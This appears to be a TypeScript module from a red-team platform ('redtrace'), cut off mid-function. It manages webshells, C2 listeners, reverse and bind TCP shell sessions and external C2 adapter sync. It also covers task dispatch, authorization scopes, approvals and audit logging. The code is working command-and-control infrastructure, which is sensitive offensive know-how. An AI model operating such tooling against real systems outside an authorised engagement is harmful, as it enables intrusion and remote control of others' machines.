import { readFileSync, mkdirSync, writeFileSync, statSync, rmSync } from 'node:fs'
import path from 'node:path'
import { randomBytes, createHash, timingSafeEqual } from 'node:crypto'
import net from 'node:net'
import { Type } from 'typebox'
import type { Store } from './store.ts'
import { HttpError, now } from './types.ts'
import { body, queryNumber, send } from './http.ts'
import type { Router, RequestContext } from './http.ts'
import { executeWebshell, operationCommand, operationSupported } from './operation-execution.ts'
import { ExecutionError, commandFrame, errorResult, executionResult, parseCommandFrame, validateExecutionResult, type ExecutionResult } from './execution-result.ts'
import { RemoteTerminalManager } from './remote-terminal.ts'
import { PivotRuntime } from './pivot-runtime.ts'
import { buildBeacon, compatibleOneliners, generateOneliner } from './c2-payloads.ts'

export const resourceKinds = ['webshell', 'c2_listener', 'c2_session', 'c2_payload', 'c2_profile', 'proxy', 'host', 'terminal', 'entry', 'file', 'credential_ref', 'result']
export const terminalTasks = ['succeeded', 'failed', 'cancelled', 'rejected']
export const digest = (s: string | Buffer) => createHash('sha256').update(s).digest('hex')
const TASK_SUMMARY_LIMIT = 1000
const summarize = (value: string) => value.slice(0, TASK_SUMMARY_LIMIT)
const uid = (prefix: string) => `${prefix}_${randomBytes(7).toString('hex')}`
const object = Type.Record(Type.String(), Type.Unknown())
const text = (maxLength = 128) => Type.String({ minLength: 1, maxLength })
const optional = Type.Optional
const actorFields = { actor_type: optional(Type.Union(['human', 'worker', 'system'].map(v => Type.Literal(v)))), actor: optional(text()), intent_id: optional(Type.Union([Type.String(), Type.Null()])), fact_id: optional(Type.Union([Type.String(), Type.Null()])) }
const c2Predicate = "action LIKE 'c2.%' OR resource_id IN (SELECT id FROM shared_resources WHERE kind LIKE 'c2_%') OR task_id IN (SELECT t.id FROM operation_tasks t JOIN shared_resources r ON r.id=t.resource_id WHERE r.kind='c2_session')"
async function rawBody(req: RequestContext['req'], limit = 64 * 1024 * 1024) {
  const chunks: Buffer[] = []; let size = 0
  for await (const chunk of req) { size += chunk.length; if (size > limit) throw new HttpError(413, 'Payload file exceeds 64 MB'); chunks.push(chunk) }
  if (!size) throw new HttpError(400, 'Payload file is empty')
  return Buffer.concat(chunks)
}

export class Operations {
  readonly store: Store
  readonly outputRoot: string
  private running = new Map<string, { abort: AbortController; completion: Promise<void> }>()
  private listeners = new Map<string, net.Server | net.Socket>()
  private externalTimers = new Map<string, NodeJS.Timeout>()
  private externalSyncs = new Map<string, AbortController>()
  private channels = new Map<string, net.Socket>()
  private staleTimer: NodeJS.Timeout
  private closed = false
  private readonly isAdapterAvailable: (plugin: string) => boolean
  readonly terminals: RemoteTerminalManager
  readonly pivots: PivotRuntime
  constructor(store: Store, root: string, isAdapterAvailable: (plugin: string) => boolean = () => true) {
    this.isAdapterAvailable = isAdapterAvailable
    this.store = store; this.outputRoot = path.join(root, '.redtrace/output')
    this.terminals = new RemoteTerminalManager(this)
    this.pivots = new PivotRuntime(this, root)
    const oldColumns = store.db.prepare('PRAGMA table_info(operation_tasks)').all() as any[]
    const file = (store.db.prepare('PRAGMA database_list').all() as any[]).find(row => row.name === 'main')?.file
    if (oldColumns.length && !oldColumns.some(row => row.name === 'result_json') && file) {
      store.db.prepare('VACUUM INTO ?').run(`${file}.operations-v1-${randomBytes(6).toString('hex')}.snapshot`)
    }
    store.transaction(() => {
      store.db.exec(readFileSync(new URL('./operations.sql', import.meta.url), 'utf8'))
      const version = store.db.prepare("SELECT value FROM operation_schema WHERE key='version'").get() as any
      if (version.value !== '2') throw new Error(`Unsupported operations schema ${version.value}`)
      const taskColumns = new Set((store.db.prepare('PRAGMA table_info(operation_tasks)').all() as any[]).map(row => row.name))
      if (!taskColumns.has('attempt_id')) store.db.exec('ALTER TABLE operation_tasks ADD COLUMN attempt_id TEXT')
      if (!taskColumns.has('result_json')) store.db.exec("ALTER TABLE operation_tasks ADD COLUMN result_json TEXT NOT NULL DEFAULT '{}'")
    })
    // An interrupted external operation cannot be inferred safe to repeat.
    const interrupted = executionResult('Process interrupted; external result unknown. Verify before resubmitting.', null, { completion: 'unknown', error_code: 'UNKNOWN_RESULT' })
    for (const task of store.db.prepare("SELECT id FROM operation_tasks WHERE status='running'").all() as any[]) this.finish(task.id, interrupted)
    // Saved metadata cannot resurrect a socket, PTY, or tunnel after restart.
    for (const row of store.db.prepare("SELECT * FROM shared_resources WHERE kind IN ('c2_session','terminal','proxy') AND status='available'").all() as any[]) {
      const metadata = JSON.parse(row.metadata_json)
      metadata.verified_capabilities = []; metadata.connection_restored = false
      this.updateResource(row.id, { status: 'offline', metadata_json: JSON.stringify(metadata) })
    }
    this.staleTimer = setInterval(() => { if (!this.closed) this.expireStale() }, 30_000)
    this.staleTimer.unref()
    this.wake()
  }
  wake() { queueMicrotask(() => { if (!this.closed) this.dispatch() }) }
  private dispatch() {
    const db = this.store.db
    for (const [id, entry] of this.running) if (this.task(id).cancel_requested) entry.abort.abort()
    for (const row of db.prepare("SELECT t.* FROM operation_tasks t JOIN shared_resources r ON r.id=t.resource_id WHERE t.status='queued' AND t.cancel_requested=0 AND r.kind IN ('webshell','c2_session','entry') ORDER BY t.created_at").all()) {
      if (this.running.size >= 8) break
      const task = row as any, resource = this.resource(task.resource_id), abort = new AbortController()
      if ([...this.running.keys()].some(id => this.task(id).resource_id === task.resource_id)) continue
      const connection = JSON.parse(resource.metadata_json).connection_type
      if (!this.beforeDispatch(task, resource)) continue
      if (resource.kind === 'c2_session' && !this.channels.has(task.resource_id) && !['direct', 'external_c2'].includes(connection)) continue
      this.store.transaction(() => { db.prepare("UPDATE operation_tasks SET status='running',started_at=? WHERE id=? AND status='queued'").run(now(), task.id); this.audit(task.project_id, task.resource_id, task.id, task, `operation.${task.action}`, 'running') })
      const cwd = path.join(this.outputRoot, 'operations', task.id); mkdirSync(cwd, { recursive: true })
      const entry = { abort, completion: Promise.resolve() }; this.running.set(task.id, entry)
      entry.completion = (async () => {
        try {
          const channel = this.channels.get(task.resource_id)
          if (channel) {
            const args = JSON.parse(task.input_json)
            this.finish(task.id, await this.executeChannel(channel, operationCommand(task.action, args, JSON.parse(resource.metadata_json)), Number(args.timeout ?? 20), abort.signal))
          }
          else {
            const { executeOperation } = await import('./operation-execution.ts'); this.finish(task.id, await executeOperation(resource, task, cwd, abort.signal))
          }
        }
        catch (error) {
          this.finish(task.id, errorResult(error))
          // An unknown command boundary must never leak into the next task.
          const channel = this.channels.get(task.resource_id)
          if (channel) { channel.destroy(); this.channels.delete(task.resource_id) }
        }
        finally { this.running.delete(task.id); this.wake() }
      })()
    }
  }
  async close() { this.closed = true; clearInterval(this.staleTimer); for (const entry of this.running.values()) entry.abort.abort(); for (const id of new Set([...this.listeners.keys(), ...this.externalTimers.keys(), ...this.externalSyncs.keys()])) this.stopListener(id); for (const socket of this.channels.values()) socket.destroy(); await this.terminals.closeAll(); await this.pivots.closeAll(); await Promise.all([...this.running.values()].map(r => r.completion)); await new Promise<void>(resolve => setImmediate(resolve)) }
  async cancelProject(project: string) {
    this.store.db.prepare("UPDATE operation_tasks SET cancel_requested=1,status=CASE WHEN status IN ('queued','running') THEN 'cancelled' ELSE status END,completed_at=CASE WHEN status IN ('queued','running') THEN ? ELSE completed_at END WHERE project_id=? AND status NOT IN ('succeeded','failed','cancelled','rejected')").run(now(), project)
    for (const [id, entry] of this.running) if (this.task(id).project_id === project) entry.abort.abort()
    await Promise.all([...this.running].filter(([id]) => this.task(id).project_id === project).map(([, entry]) => entry.completion))
  }
  private validToken(row: any, token: string, key: string) {
    const expected = JSON.parse(row.secret_json)[key] ?? '', actual = digest(token)
    if (!token || expected.length !== actual.length || !timingSafeEqual(Buffer.from(expected), Buffer.from(actual))) throw new HttpError(404, row.kind === 'c2_listener' ? 'Listener not found' : 'Session not found')
  }
  listener(id: string, token: string) { const row = this.resource(id); if (row.kind !== 'c2_listener' || row.status !== 'available') throw new HttpError(404, 'Listener not found'); this.validToken(row, token, 'listener_token_sha256'); return row }
  session(id: string, token: string) { const row = this.resource(id); if (row.kind !== 'c2_session') throw new HttpError(404, 'Session not found'); this.validToken(row, token, 'session_token_sha256'); return row }
  async startListener(id: string) {
    const resource = this.resource(id), metadata = JSON.parse(resource.metadata_json), type = metadata.listener_type
    this.stopListener(id)
    if (!this.adapterEnabled('redtrace-c2')) return
    if (resource.status !== 'available') return
    if (type === 'external_c2') { void this.syncExternal(resource); return }
    if (!['tcp_reverse', 'tcp_bind'].includes(type)) return
    const port = Number(metadata.bind_port ?? metadata.target_port); if (!Number.isSafeInteger(port) || port < 1 || port > 65535) { this.updateResource(id, { status: 'degraded', summary: 'listener port must be between 1 and 65535' }); return }
    if (type === 'tcp_reverse') {
      const server = net.createServer(socket => this.attachChannel(resource, socket, 'reverse')); this.listeners.set(id, server)
      server.on('error', error => { if (!this.closed) this.updateResource(id, { status: 'degraded', summary: error.message.slice(0, 1000) }) })
      server.listen(port, metadata.bind_host ?? '0.0.0.0')
    } else {
      const socket = net.createConnection(port, metadata.target_host ?? '127.0.0.1', () => this.attachChannel(resource, socket, 'bind')); this.listeners.set(id, socket)
      socket.on('error', error => { if (!this.closed) this.updateResource(id, { status: 'degraded', summary: error.message.slice(0, 1000) }) })
    }
  }
  stopListener(id: string) {
    const timer = this.externalTimers.get(id); if (timer) clearTimeout(timer); this.externalTimers.delete(id)
    this.externalSyncs.get(id)?.abort(); this.externalSyncs.delete(id)
    const listener = this.listeners.get(id); this.listeners.delete(id)
    if (listener instanceof net.Server) listener.close(); else listener?.destroy()
    for (const [session, socket] of this.channels) if ((socket as any).redtraceListener === id) { socket.destroy(); this.channels.delete(session); try { this.updateResource(session, { status: 'offline' }) } catch {} }
  }
  private async syncExternal(listener: any) {
    const metadata = JSON.parse(listener.metadata_json), secret = JSON.parse(listener.secret_json), endpoint = String(secret.adapter_endpoint ?? metadata.adapter_endpoint ?? '').replace(/\/$/, '')
    if (!endpoint) { this.updateResource(listener.id, { status: 'degraded', summary: 'external C2 adapter_endpoint is required' }); return }
    const controller = new AbortController(); this.externalSyncs.set(listener.id, controller)
    try {
      const response = await fetch(`${endpoint}/sessions?framework=${encodeURIComponent(metadata.listener_type ?? 'custom')}`, { headers: { Accept: 'application/json', ...(secret.token ? { Authorization: `Bearer ${secret.token}` } : {}) }, signal: AbortSignal.any([controller.signal, AbortSignal.timeout(Math.min(30, Number(metadata.sync_interval ?? 5)) * 1000)]) })
      if (!response.ok) throw new Error(`HTTP ${response.status}`)
      const value: any = await response.json(), sessions = Array.isArray(value) ? value : value.sessions
      if (!Array.isArray(sessions)) throw new Error('external C2 adapter sessions response must be a list')
      const seen = new Set<string>(), at = now()
      for (const raw of sessions) {
        if (!raw || typeof raw !== 'object') continue
        const external = String(raw.id ?? raw.session_id ?? raw.external_id ?? ''); if (!external) continue; seen.add(external)
        const sessionMetadata = { ...raw, source_project_id: listener.project_id ?? metadata.source_project_id, framework: metadata.listener_type ?? 'custom', connection_type: 'external_c2', shell_type: raw.shell_type ?? metadata.listener_type ?? 'custom', external_session_id: external }
        const row: any = this.store.db.prepare("SELECT * FROM shared_resources WHERE kind='c2_session' AND parent_resource_id=? AND target=?").get(listener.id, external)
        if (!row) this.create(listener.project_id, { kind: 'c2_session', name: raw.name ?? raw.hostname ?? `${metadata.listener_type}:${external}`, target: external, summary: raw.summary ?? `${metadata.listener_type} session`, metadata: sessionMetadata, secret: { endpoint: `${endpoint}/execute`, token: secret.token ?? '' }, actor_type: 'system', actor: `listener:${listener.id}`, parent_resource_id: listener.id })
        else this.updateResource(row.id, { status: 'available', metadata_json: JSON.stringify(sessionMetadata), last_seen_at: at })
      }
      for (const row of this.store.db.prepare("SELECT id,target FROM shared_resources WHERE kind='c2_session' AND parent_resource_id=?").all(listener.id) as any[]) if (!seen.has(row.target)) this.updateResource(row.id, { status: 'offline' })
    } catch (error) { if (!this.closed && !controller.signal.aborted) this.audit(listener.project_id, listener.id, null, { actor_type: 'system', actor: 'shell-broker' }, 'c2.listener_error', 'degraded', { error: error instanceof Error ? error.message : String(error) }) }
    finally { if (this.externalSyncs.get(listener.id) === controller) this.externalSyncs.delete(listener.id) }
    if (!this.closed && !controller.signal.aborted) try { if (this.resource(listener.id).status === 'available') this.externalTimers.set(listener.id, setTimeout(() => void this.syncExternal(this.resource(listener.id)), Math.max(1, Math.min(300, Number(metadata.sync_interval ?? 5))) * 1000)) } catch {}
  }
  private attachChannel(listener: any, socket: net.Socket, connection: string) {
    ;(socket as any).redtraceListener = listener.id
    const peer = `${socket.remoteAddress ?? 'unknown'}:${socket.remotePort ?? 0}`
    const created = this.create(listener.project_id, { kind: 'c2_session', name: `${connection}:${peer}`, target: peer, summary: `${connection} raw TCP shell`, metadata: { connection_type: connection, shell_type: 'raw_tcp', transport: 'tcp', capabilities: ['command'] }, actor_type: 'system', actor: `listener:${listener.id}`, parent_resource_id: listener.id })
    const id = created.resource.id; this.channels.set(id, socket); this.audit(listener.project_id, id, null, { actor_type: 'system', actor: `listener:${listener.id}` }, 'c2.session_online', 'succeeded', { connection_type: connection, peer })
    socket.on('close', () => { this.channels.delete(id); if (this.closed) return; try { this.updateResource(id, { status: 'offline' }); this.audit(listener.project_id, id, null, { actor_type: 'system', actor: 'shell-broker' }, 'c2.session_offline', 'offline') } catch {} })
  }
  private executeChannel(socket: net.Socket, command: string, seconds: number, signal: AbortSignal) {
    if (!command?.trim()) throw new ExecutionError('PROTOCOL_ERROR', 'command is required')
    const frame = commandFrame(command)
    return new Promise<ExecutionResult>((resolve, reject) => {
      const chunks: Buffer[] = []; let timeout: NodeJS.Timeout, settled = false
      const done = (error?: Error, result?: ExecutionResult) => { if (settled) return; settled = true; clearTimeout(timeout); signal.removeEventListener('abort', abort); socket.off('data', data); socket.off('close', closed); error ? reject(error) : resolve(result!) }
      let bytes = 0
      const data = (chunk: Buffer) => { bytes += chunk.length; chunks.push(chunk); if (bytes > 2 * 1024 * 1024) { done(new ExecutionError('PROTOCOL_ERROR', 'Raw channel output exceeded 2 MiB; resynchronization required', Buffer.concat(chunks).subarray(0, 2 * 1024 * 1024).toString(), { truncated: true })); return }; const result = parseCommandFrame(Buffer.concat(chunks).toString(), frame); if (result) done(undefined, { ...result, execution_context: { protocol: 'raw_tcp' } }) }
      const closed = () => done(new ExecutionError('TRANSPORT_ERROR', 'shell channel closed', Buffer.concat(chunks).toString()))
      const abort = () => done(new ExecutionError('CANCELLED', 'Operation cancelled; external side effects may have occurred', Buffer.concat(chunks).toString()))
      socket.on('data', data); socket.once('close', closed); signal.addEventListener('abort', abort, { once: true }); timeout = setTimeout(() => done(new ExecutionError('TIMEOUT', 'shell command timed out; external result is unknown', Buffer.concat(chunks).toString())), Math.max(.5, Math.min(300, seconds)) * 1000)
      socket.write(frame.command + '\n')
    })
  }
  scope(id: string) { if (id !== '_global') this.store.project(id); return id === '_global' ? null : id }
  resource(id: string): any { const r = this.store.db.prepare('SELECT * FROM shared_resources WHERE id=?').get(id); if (!r) throw new HttpError(404, 'Shared resource not found'); return r }
  task(id: string): any { const t = this.store.db.prepare('SELECT * FROM operation_tasks WHERE id=?').get(id); if (!t) throw new HttpError(404, 'Operation task not found'); return t }
  publicResource(row: any) {
    const { secret_json, metadata_json, ...item } = row, secret = JSON.parse(secret_json), metadata = JSON.parse(metadata_json)
    const result = { ...item, metadata, has_secret: Object.keys(secret).length > 0, worker_paused: !!item.worker_paused, locked: !!item.locked_by,
      source_project_id: item.project_id ?? metadata.source_project_id ?? null, scope: 'global',
      source: { project_id: item.project_id ?? metadata.source_project_id ?? null, intent_id: item.intent_id, worker: item.worker, task_id: item.source_task_id, created_by_type: item.created_by_type, created_by: item.created_by } }
    if (item.kind === 'c2_payload') delete metadata.command
    if (item.kind === 'c2_listener') result.checkin_path = `/c2/checkin/${item.id}`
    if (item.kind === 'c2_session' && ['beacon', 'agent'].includes(metadata.connection_type ?? 'beacon')) result.poll_path = `/c2/sessions/${item.id}/poll`
    return result
  }
  publicTask({ input_json, result_json, ...task }: any) { return { ...task, input: JSON.parse(input_json), result: JSON.parse(result_json || '{}'), requires_approval: !!task.requires_approval, cancel_requested: !!task.cancel_requested } }
  expireStale(project?: string) {
    const rows = this.store.db.prepare(`SELECT * FROM shared_resources WHERE kind='c2_session' AND status IN ('available','offline') AND last_seen_at IS NOT NULL ${project ? 'AND project_id=?' : ''}`).all(...(project ? [project] : [])) as any[], cutoff = Date.now() - 120_000
    for (const row of rows) {
      const connection = JSON.parse(row.metadata_json).connection_type ?? 'beacon'
      if (['beacon', 'agent'].includes(connection) && (row.status === 'offline' || Date.parse(row.last_seen_at) < cutoff)) {
        const at = now()
        this.store.transaction(() => {
          if (row.status === 'available') this.updateResource(row.id, { status: 'offline' })
          const pending = this.store.db.prepare("SELECT * FROM operation_tasks WHERE resource_id=? AND status IN ('queued','running')").all(row.id) as any[]
          for (const task of pending) {
            const message = task.status === 'running'
              ? 'C2 session went offline before a result was received; external result is unknown. Verify before resubmitting.'
              : 'C2 session went offline before the task was dispatched. Retry after the session returns.'
            this.finish(task.id, executionResult(message, null, { error_code: task.status === 'running' ? 'UNKNOWN_RESULT' : 'TRANSPORT_ERROR' }))
          }
          if (row.status === 'available') this.audit(row.project_id, row.id, null, { actor_type: 'system', actor: 'session-monitor' }, 'c2.session_offline', 'offline', { failed_tasks: pending.length })
        })
      }
    }
  }
  audit(project: string | null, resource: string | null, task: string | null, actor: any, action: string, status: string, detail = {}) {
    this.store.db.prepare('INSERT INTO resource_audit_events(project_id,resource_id,task_id,actor_type,actor,action,status,detail_json,created_at) VALUES (?,?,?,?,?,?,?,?,?)').run(project === '_global' ? null : project, resource, task, actor.actor_type ?? 'human', actor.actor ?? 'admin', action, status, JSON.stringify(detail), now())
  }
  verifiedResource(id: string, fields: Record<string, any>, kind = 'capability.verified') {
    const row = this.resource(id), old = JSON.parse(row.metadata_json), metadata = JSON.parse(fields.metadata_json ?? row.metadata_json)
    const fresh = old.runtime_verified !== true || (metadata.verified_capabilities ?? []).some((capability: string)=>!(old.verified_capabilities ?? []).includes(capability)) || metadata.verified_endpoint !== old.verified_endpoint
    metadata.runtime_verified = true; metadata.verification_version = Number(old.verification_version ?? 0) + (fresh ? 1 : 0)
    const result = this.updateResource(id, { ...fields, metadata_json: JSON.stringify(metadata) }, true)
    if (fresh && row.project_id) this.store.recordCriticalSignal(row.project_id, `${kind}:${id}:${metadata.verification_version}`, { kind, resourceId: id, version: metadata.verification_version })
    return result
  }
  updateResource(id: string, fields: Record<string, any>, verified = false) {
    const row = this.resource(id), metadata = JSON.parse(row.metadata_json)
    const invalidate = !verified && (fields.status && fields.status !== 'available' || fields.secret_json !== undefined && fields.secret_json !== row.secret_json || fields.metadata_json !== undefined && fields.metadata_json !== row.metadata_json)
    if (invalidate) {
      const next = JSON.parse(fields.metadata_json ?? row.metadata_json)
      next.runtime_verified = false; next.verified_capabilities = []; delete next.verified_at; delete next.verified_endpoint
      next.verification_version = Number(metadata.verification_version ?? 0) + (metadata.runtime_verified ? 1 : 0)
      fields.metadata_json = JSON.stringify(next)
    }
    fields.updated_at = now()
    this.store.db.prepare(`UPDATE shared_resources SET ${Object.keys(fields).map(k => `${k}=?`).join(',')} WHERE id=?`).run(...Object.values(fields), id)
    if (invalidate) {
      if (metadata.runtime_verified && row.project_id) this.store.recordCriticalSignal(row.project_id, `capability.lost:${id}:${Number(metadata.verification_version ?? 0)}`, { kind: 'capability.lost', resourceId: id })
      const dependents = this.store.db.prepare("SELECT id FROM shared_resources WHERE id<>? AND status='available' AND (parent_resource_id=? OR json_extract(metadata_json,'$.source_resource_id')=? OR EXISTS(SELECT 1 FROM json_each(metadata_json,'$.dependencies') WHERE value=?))").all(id,id,id,id) as {id:string}[]
      for (const dependent of dependents) this.updateResource(dependent.id,{status:'degraded'})
    }
    return this.publicResource(this.resource(id))
  }
  available(resource: any, actor: any) {
    if (actor.actor_type === 'worker' && resource.worker_paused) throw new HttpError(423, 'Worker operations are paused for this resource')
    if (resource.locked_by && (resource.locked_by !== actor.actor || resource.locked_by_type !== actor.actor_type)) throw new HttpError(423, `Resource is locked by ${resource.locked_by_type}:${resource.locked_by}`)
    if (resource.status === 'retired') throw new HttpError(409, 'Resource is retired')
  }
  adapterEnabled(plugin: string) { return this.isAdapterAvailable(plugin) }
  async synchronizeAdapters() {
    if (!this.adapterEnabled('redtrace-c2')) {
      for (const id of new Set([...this.listeners.keys(), ...this.externalTimers.keys(), ...this.externalSyncs.keys()])) this.stopListener(id)
      for (const socket of this.channels.values()) socket.destroy()
    }
    for (const [id, entry] of this.running) {
      const resource = this.resource(this.task(id).resource_id)
      if (!this.adapterEnabled(resource.kind === 'webshell' || resource.kind === 'entry' ? 'redtrace-webshell' : 'redtrace-c2')) entry.abort.abort()
    }
    if (!this.adapterEnabled('redtrace-remote-terminal') || !this.adapterEnabled('redtrace-c2')) await this.terminals.closeAll()
    if (!this.adapterEnabled('redtrace-pivot')) await this.pivots.closeAll()
    this.wake()
  }
  beforeDispatch(task: any, resource: any) {
    const plugin = resource.kind === 'webshell' || resource.kind === 'entry' ? 'redtrace-webshell' : 'redtrace-c2'
    if (!this.isAdapterAvailable(plugin) || task.action === 'probe_info' && !this.isAdapterAvailable('redtrace-session-probe')) {
      this.finish(task.id, executionResult('Adapter disabled before dispatch', null, { error_code: 'ADAPTER_DISABLED' })); return false
    }
    try {
      this.available(resource, task)
      if (resource.status !== 'available') throw new HttpError(409, `Resource is ${resource.status}`)
      if (task.actor_type === 'worker') {
        const project = this.store.project(task.project_id)
        if (project.status !== 'active') throw new HttpError(409, 'Project is not active')
        if (!task.approved_by && !this.authorized(task.project_id, task.action, resource)) throw new HttpError(403, 'Project authorization expired, revoked, or does not match')
      }
      return true
    } catch (error) { this.finish(task.id, executionResult(error instanceof Error ? error.message : String(error), null, { error_code: 'AUTH_FAILED' })); return false }
  }
  private actionRisk(action: string, requested = 'low') {
    const fixed: Record<string, string> = { command: 'high', delete_file: 'high', move_file: 'high', write_file: 'high', create_file: 'medium', create_directory: 'medium', 'pivot.open': 'high', 'terminal.signal': 'medium' }
    const order = ['low', 'medium', 'high', 'critical']
    return order[Math.max(order.indexOf(fixed[action] ?? 'low'), Math.max(0, order.indexOf(requested)))]!
  }
  authorized(project: string | null, action: string, resource: any) {
    if (!project) return false
    const at = now(), rows = this.store.db.prepare("SELECT * FROM operation_authorizations WHERE project_id=? AND revoked_at IS NULL AND expires_at>?").all(project, at) as any[]
    return rows.some(row => {
      const actions = JSON.parse(row.actions_json), resources = JSON.parse(row.resources_json), targets = JSON.parse(row.targets_json)
      const actionOk = actions.includes('*') || actions.includes(action)
      const resourceOk = !resources.length || resources.includes(resource.id)
      // Scope matching is exact: 10.0.0.1 must not authorize 10.0.0.10.
      const targetOk = !targets.length || targets.includes(resource.target)
      const routes = JSON.parse(row.route_ids_json), route = JSON.parse(resource.metadata_json ?? '{}').route_id
      return actionOk && resourceOk && targetOk && (!routes.length || routes.includes(route)) && (resources.length > 0 || targets.length > 0)
    })
  }
  lease(resource: any, input: { owner_type?: string; owner?: string; run_id?: string; ttl_seconds?: number; fencing_token?: number }) {
    if (!input.owner || !['human', 'worker'].includes(input.owner_type ?? 'worker')) throw new HttpError(422, 'Lease owner and valid owner_type are required')
    const metadata = JSON.parse(resource.metadata_json), conflict = String(metadata.conflict_key ?? resource.id), at = Date.now(), ttl = Math.max(5, Math.min(3600, Number(input.ttl_seconds ?? 120)))
    const current: any = this.store.db.prepare('SELECT * FROM resource_leases WHERE conflict_key=?').get(conflict)
    if (current && Date.parse(current.expires_at) > at && (current.owner !== input.owner || current.owner_type !== (input.owner_type ?? 'worker'))) throw new HttpError(423, `Resource lease belongs to ${current.owner_type}:${current.owner}`)
    if (input.fencing_token !== undefined && (!current || current.fencing_token !== input.fencing_token)) throw new HttpError(409, 'Stale fencing token')
    const token = (current?.fencing_token ?? 0) + 1, expires = new Date(at + ttl * 1000).toISOString(), updated = now()
    this.store.db.prepare(`INSERT INTO resource_leases VALUES (?,?,?,?,?,?,?,?) ON CONFLICT(conflict_key) DO UPDATE SET resource_id=excluded.resource_id,owner_type=excluded.owner_type,owner=excluded.owner,run_id=excluded.run_id,fencing_token=excluded.fencing_token,expires_at=excluded.expires_at,updated_at=excluded.updated_at`).run(conflict, resource.id, input.owner_type ?? 'worker', input.owner, input.run_id ?? null, token, expires, updated)
    return { conflict_key: conflict, resource_id: resource.id, owner_type: input.owner_type ?? 'worker', owner: input.owner ?? 'unknown', run_id: input.run_id ?? null, fencing_token: token, expires_at: expires }
  }
  checkLease(resource: any, input: any) {
    this.available(resource, input)
    const metadata = JSON.parse(resource.metadata_json), conflict = String(metadata.conflict_key ?? resource.id), lease: any = this.store.db.prepare('SELECT * FROM resource_leases WHERE conflict_key=?').get(conflict)
    if (!lease || Date.parse(lease.expires_at) <= Date.now()) throw new HttpError(423, 'A live resource lease is required')
    if (lease.owner !== input.actor || lease.owner_type !== input.actor_type || lease.fencing_token !== Number(input.fencing_token)) throw new HttpError(409, 'Stale or foreign fencing token')
    return lease
  }
  releaseLease(resource: any, input: any) {
    const lease = this.checkLease(resource, input)
    this.store.db.prepare('UPDATE resource_leases SET expires_at=?,updated_at=? WHERE conflict_key=?').run(now(), now(), lease.conflict_key)
  }
  releaseRunLeases(runId: string) { this.store.db.prepare('UPDATE resource_leases SET expires_at=?,updated_at=? WHERE run_id=?').run(now(), now(), runId) }
  create(project: string | null, input: any) {
    return this.store.transaction(() => {
      if (!resourceKinds.includes(input.kind)) throw new HttpError(400, 'Unsupported resource kind')
      const prefixes: Record<string, string> = { webshell: 'ws', c2_listener: 'lis', c2_session: 'ses', c2_payload: 'pay', c2_profile: 'prf', proxy: 'prx', host: 'hst', terminal: 'tty', entry: 'ent', file: 'fil', credential_ref: 'cred', result: 'res' }
      const id = uid(prefixes[input.kind]), metadata = { ...input.metadata }, secret = { ...input.secret }, at = now()
      if(input.actor_type==='worker') for(const key of ['verified_capabilities','verified_at','verified_endpoint','runtime_verified','verification_version','conflict_key']) delete metadata[key]
      let status = input.status ?? 'available', secret_once: string | undefined
      if (project) metadata.source_project_id ??= project
      if (input.parent_resource_id) this.resource(input.parent_resource_id)
      if (input.kind === 'c2_listener') {
        metadata.listener_type = String(metadata.listener_type ?? 'http_beacon').toLowerCase()
        if (!['http_beacon', 'https_beacon', 'tcp_reverse', 'tcp_bind', 'external_c2'].includes(metadata.listener_type)) throw new HttpError(400, 'Unsupported listener type')
        secret_once = randomBytes(32).toString('base64url'); secret.listener_token_sha256 = digest(secret_once); secret.listener_token = secret_once
        if (!['available', 'offline'].includes(status)) status = 'offline'
      }
      if (input.kind === 'c2_session') {
        const connection = metadata.connection_type ?? 'beacon'
        if (['reverse', 'reverse_shell'].includes(connection) && !input.parent_resource_id) throw new HttpError(400, 'Reverse sessions require a listener')
        if (metadata.credential_id) {
          const credential = this.resource(metadata.credential_id)
          if (credential.kind !== 'credential_ref') throw new HttpError(400, 'Credential resource not found')
          Object.assign(metadata, { ...JSON.parse(credential.metadata_json), ...metadata }); Object.assign(secret, { ...JSON.parse(credential.secret_json), ...secret })
        }
        if (['beacon', 'agent'].includes(connection) && !secret.session_token_sha256) { secret_once = randomBytes(32).toString('base64url'); secret.session_token_sha256 = digest(secret_once) }
      }
      this.store.db.prepare(`INSERT INTO shared_resources(id,project_id,kind,name,status,target,summary,metadata_json,secret_json,created_by_type,created_by,worker,intent_id,fact_id,parent_resource_id,source_task_id,created_at,updated_at,last_seen_at) VALUES (${Array(19).fill('?').join(',')})`).run(
        id, project, input.kind, input.name.trim(), status, input.target?.trim() ?? '', input.summary?.trim() ?? '', JSON.stringify(metadata), JSON.stringify(secret), input.actor_type ?? 'human', input.actor ?? 'admin', input.worker ?? null, input.intent_id ?? null, input.fact_id ?? null, input.parent_resource_id ?? null, input.source_task_id ?? null, at, at, input.kind === 'c2_session' ? at : null)
      this.audit(project, id, input.source_task_id ?? null, input, 'resource.register', 'succeeded', { kind: input.kind, name: input.name, target: input.target ?? '', intent_id: input.intent_id ?? null })
      return { resource: this.publicResource(this.resource(id)), ...(secret_once ? { secret_once } : {}) }
    })
  }
  createTask(project: string | null, id: string, input: any) {
    return this.store.transaction(() => {
      const resource = this.resource(id); this.available(resource, input)
      if (!['webshell', 'c2_session', 'entry'].includes(resource.kind)) throw new HttpError(409, 'This resource type does not accept operation tasks')
      if (!operationSupported(resource, input.action)) throw new HttpError(422, 'CAPABILITY_UNSUPPORTED: channel has no implementation for this action')
      if (resource.kind === 'c2_session' && resource.status !== 'available') throw new HttpError(409, `C2 session is ${resource.status}`)
      const risk = this.actionRisk(input.action, input.risk), preauthorized = input.actor_type === 'worker' && this.authorized(project, input.action, resource)
      const approval = input.actor_type === 'worker' && !preauthorized, op = uid('op'), attempt = uid('try'), status = approval ? 'awaiting_approval' : 'queued'
      this.store.db.prepare('INSERT INTO operation_tasks(id,project_id,resource_id,intent_id,fact_id,action,actor_type,actor,risk,status,input_json,requires_approval,created_at,attempt_id) VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?)').run(op, project, id, input.intent_id ?? null, input.fact_id ?? null, input.action, input.actor_type ?? 'human', input.actor ?? 'admin', risk, status, JSON.stringify(input.arguments ?? {}), Number(approval), now(), attempt)
      this.audit(project, id, op, input, `operation.${input.action}`, status, { risk, preauthorized, attempt_id: attempt, intent_id: input.intent_id ?? null })
      this.wake()
      return this.publicTask(this.task(op))
    })
  }
  finish(id: string, result: ExecutionResult) {
    result = validateExecutionResult(result)
    return this.store.transaction(() => {
      const task = this.task(id); if (terminalTasks.includes(task.status) && (task.status !== 'cancelled' || task.result_ref)) return this.publicTask(task)
